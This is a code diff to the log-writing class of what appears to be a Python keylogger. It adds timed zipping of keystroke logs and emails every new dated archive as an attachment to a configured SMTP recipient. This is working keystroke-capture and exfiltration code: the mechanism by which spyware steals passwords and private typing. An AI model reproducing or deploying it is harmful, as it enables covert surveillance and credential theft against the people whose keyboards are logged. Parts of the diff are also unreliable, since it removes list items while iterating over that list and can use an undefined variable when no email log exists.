@@ -65,7 +65,7 @@ class LogWriter:
 
         # initialize the automatic zip and email timer, if enabled in .ini
         if self.settings['smtpsendemail'] == 'True':
-            self.emailtimer = mytimer.MyTimer(float(self.settings['emailinterval'])*60*60, 0, self.ZipAndEmailTimerAction)
+            self.emailtimer = mytimer.MyTimer(float(self.settings['emailinterval'])*60*60, 0, self.SendZipByEmail)
             self.emailtimer.start()
         
         # initialize automatic old log deletion timer
@@ -73,6 +73,7 @@ class LogWriter:
             self.oldlogtimer = mytimer.MyTimer(float(self.settings['agecheckinterval'])*60*60, 0, self.DeleteOldLogs)
             self.oldlogtimer.start()
         
+        # initialize the automatic timestamp timer
         if self.settings['timestampenable'] == 'True':
             self.timestamptimer = mytimer.MyTimer(float(self.settings['timestampinterval'])*60, 0, self.WriteTimestamp)
             self.timestamptimer.start()
@@ -80,6 +81,13 @@ class LogWriter:
         # initialize the automatic log flushing timer
         self.flushtimer = mytimer.MyTimer(float(self.settings['flushinterval']), 0, self.FlushLogWriteBuffers, ["Flushing file write buffers due to timer\n"])
         self.flushtimer.start()
+        
+        # initialize some automatic zip stuff
+        self.settings['ziparchivename'] = "log_[date].zip"
+        if self.settings['zipenable'] == 'True':
+            self.ziptimer = mytimer.MyTimer(float(self.settings['zipinterval'])*60*60, 0, self.ZipLogFiles)
+            self.ziptimer.start()
+
 
     def WriteToLogFile(self, event):
         '''Write keystroke specified in "event" object to logfile
@@ -116,8 +124,10 @@ class LogWriter:
         if event.Ascii == 27 and self.settings['parseescape'] == True:
             self.PrintStuff('[KeyName:' + event.Key + ']')
 
-        if event.Key == self.settings['flushkey']:
-            self.FlushLogWriteBuffers("Flushing write buffers due to keyboard command\n")
+        # this has now been disabled, since flushing is done both automatically at interval,
+        # and can also be performed from the control panel.
+        #if event.Key == self.settings['flushkey']:
+        #    self.FlushLogWriteBuffers("Flushing write buffers due to keyboard command\n")
 
     def TestForNoLog(self, event):
         '''This function returns False if the process name associated with an event
@@ -139,26 +149,101 @@ class LogWriter:
 
     def ZipLogFiles(self):
         '''Create a zip archive of all files in the log directory.
+        
+        Create archive name of type "log_YYYYMMDD_HHMMSS.zip
         '''
         self.FlushLogWriteBuffers("Flushing write buffers prior to zipping the logs\n")
         
+        zipFileTime = time.strftime("%Y%m%d_%H%M%S")
+        zipFileName = re.sub(r"\[date\]", zipFileTime, self.settings['ziparchivename'])
+
         os.chdir(self.settings['dirname'])
-        myzip = zipfile.ZipFile(self.settings['ziparchivename'], "w", zipfile.ZIP_DEFLATED)
+        myzip = zipfile.ZipFile(zipFileName, "w", zipfile.ZIP_DEFLATED)
         
         for root, dirs, files in os.walk(os.curdir):
             for fname in files:
-                if fname != self.settings['ziparchivename']:
+                #if fname != self.settings['ziparchivename']:
+                if not self.CheckIfZipFile(fname):
                     myzip.write(os.path.join(root,fname).split("\\",1)[1])
         
         myzip.close()
-        myzip = zipfile.ZipFile(self.settings['ziparchivename'], "r", zipfile.ZIP_DEFLATED)
+        myzip = zipfile.ZipFile(zipFileName, "r", zipfile.ZIP_DEFLATED)
         if myzip.testzip() != None:
             self.PrintDebug("Warning: Zipfile did not pass check.\n")
         myzip.close()
         
+        # write the name of the last completed zip file
+        # so that we can check against this when emailing or ftping, to make sure
+        # we do not try to transfer a zipfile which is in the process of being created
+        ziplog=open(os.path.join(self.settings['dirname'], "ziplog.txt"), 'w')
+        ziplog.write(zipFileName)
+        ziplog.close()
+    
+    def CheckIfZipFile(self, filename):
+        '''Helper function for ZipLogFiles to make sure we don't include
+        old zips into zip files.'''
+        if re.match(r"^log_[0-9]{8}_[0-9]{6}\.zip$", filename) != None:
+            return True
+        else:
+            return False
+    
     def SendZipByEmail(self):
         '''Send the zipped logfile archive by email, using mail settings specified in the .ini file
         '''
+        # basic logic flow:
+        #~ if autozip is not enabled, just call the ziplogfiles function ourselves
+        
+        #~ read ziplog.txt (in a try block) and check if it conforms to being a proper zip filename
+        #~ if not, then print error and get out
+        
+        #~ in a try block, read emaillog.txt to get latest emailed zip, and check for proper filename
+            #~ if fail, just go ahead with sending all available zipfiles
+        
+        #~ do a os.listdir() on the dirname, and trim it down to only contain our zipfiles
+            #~ and moreover, only zipfiles with names between lastemailed and latestzip, including latestzip,
+            #~ but not including lastemailed.
+        
+        #~ send all the files in list
+        
+        #~ write new lastemailed to emaillog.txt
+        
+        self.PrintDebug("Sending mail to " + self.settings['smtpto'] + "\n")
+        
+        if self.settings['zipenable'] == 'False':
+            self.ZipLogFiles()
+        
+        try:
+            ziplog = open(os.path.join(self.settings['dirname'], "ziplog.txt"), 'r')
+            latestZipFile = ziplog.readline()
+            ziplog.close()
+        except:
+            self.PrintDebug("Unexpected error opening ziplog.txt: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
+            return
+        
+        if not self.CheckIfZipFile(latestZipFile):
+            self.PrintDebug("latest zip filename does not match proper filename pattern. something went wrong. stopping.\n")
+            return
+        
+        try:
+            emaillog = open(os.path.join(self.settings['dirname'], "emaillog.txt"), 'r')
+            latestZipEmailed = emaillog.readline()
+            emaillog.close()
+        except:
+            self.PrintDebug("Error opening emaillog.txt: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\nWill email all available log zips.\n")
+        
+        if not self.CheckIfZipFile(latestZipEmailed):
+            self.PrintDebug("latest emailed zip filename does not match proper filename pattern. something went wrong. stopping.\n")
+            return
+        
+        zipFileList = os.listdir(self.settings['dirname'])
+        for filename in zipFileList:
+            if not self.CheckIfZipFile(filename):
+                zipFileList.remove(filename)
+            # we can do the following string comparison due to the structured and dated format of the filenames
+            elif filename <= latestZipEmailed or filename > latestZipFile:
+                zipFileList.remove(filename)
+                
+        
         # set up the message
         msg = MIMEMultipart()
         msg['From'] = self.settings['smtpfrom']
@@ -168,9 +253,9 @@ class LogWriter:
 
         msg.attach( MIMEText(self.settings['smtpmessagebody']) )
 
-        for file in [os.path.join(self.settings['dirname'], self.settings['ziparchivename'])]:
+        for file in zipFileList:
             part = MIMEBase('application', "octet-stream")
-            part.set_payload( open(file,"rb").read() )
+            part.set_payload( open(os.path.join(self.settings['dirname'], file),"rb").read() )
             Encoders.encode_base64(part)
             part.add_header('Content-Disposition', 'attachment; filename="%s"'
                            % os.path.basename(file))
@@ -186,9 +271,17 @@ class LogWriter:
         sendingresults=mysmtp.sendmail(self.settings['smtpfrom'], self.settings['smtpto'].split(";"), msg.as_string())
         self.PrintDebug("Email sending errors (if any): " + str(sendingresults) + "\n")
         mysmtp.quit()
+        
+        # write the latest emailed zip to log for the future
+        zipFileList.sort()
+        emaillog = open(os.path.join(self.settings['dirname'], "emaillog.txt"), 'w')
+        emaillog.write(zipFileList.pop())
+        emaillog.close()
 
     def ZipAndEmailTimerAction(self):
         '''This is a timer action function that zips the logs and sends them by email.
+        
+        deprecated - should delete this.
         '''
         self.PrintDebug("Sending mail to " + self.settings['smtpto'] + "\n")
         self.ZipLogFiles()
@@ -334,6 +427,8 @@ class LogWriter:
             self.oldlogtimer.cancel()
         if self.settings['timestampenable'] == 'True':
             self.timestamptimer.cancel()
+        if self.settings['zipenable'] == 'True':
+            self.ziptimer.cancel()
 
 if __name__ == '__main__':
     #some testing code
